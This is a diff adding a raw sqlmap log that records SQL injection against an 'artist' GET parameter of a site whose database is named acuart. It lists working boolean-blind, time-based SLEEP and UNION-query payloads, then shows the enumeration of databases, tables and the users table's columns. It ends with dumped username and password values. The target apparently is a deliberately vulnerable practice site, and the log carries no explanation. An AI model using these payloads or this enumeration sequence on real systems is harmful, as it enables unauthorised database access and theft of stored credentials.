@@ -1,0 +1,127 @@
+sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 9228=9228
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: artist=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-8863 UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6b71704e4f4141524f71674b79656a7a7462524663436d426d48686377526662636c795363614b64,0x7162706a71),NULL-- -
+---
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 9228=9228
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: artist=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-8863 UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6b71704e4f4141524f71674b79656a7a7462524663436d426d48686377526662636c795363614b64,0x7162706a71),NULL-- -
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 9228=9228
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: artist=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-8863 UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6b71704e4f4141524f71674b79656a7a7462524663436d426d48686377526662636c795363614b64,0x7162706a71),NULL-- -
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+Table: users
+[4 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| name    | numeric |
+| address | numeric |
+| email   | numeric |
+| pass    | numeric |
++---------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 9228=9228
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: artist=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-8863 UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6b71704e4f4141524f71674b79656a7a7462524663436d426d48686377526662636c795363614b64,0x7162706a71),NULL-- -
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+Table: users
+[1 entry]
++-------+
+| uname |
++-------+
+| test  |
++-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 9228=9228
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: artist=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-8863 UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6b71704e4f4141524f71674b79656a7a7462524663436d426d48686377526662636c795363614b64,0x7162706a71),NULL-- -
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+Table: users
+[1 entry]
++------+
+| pass |
++------+
+| test |
++------+
+
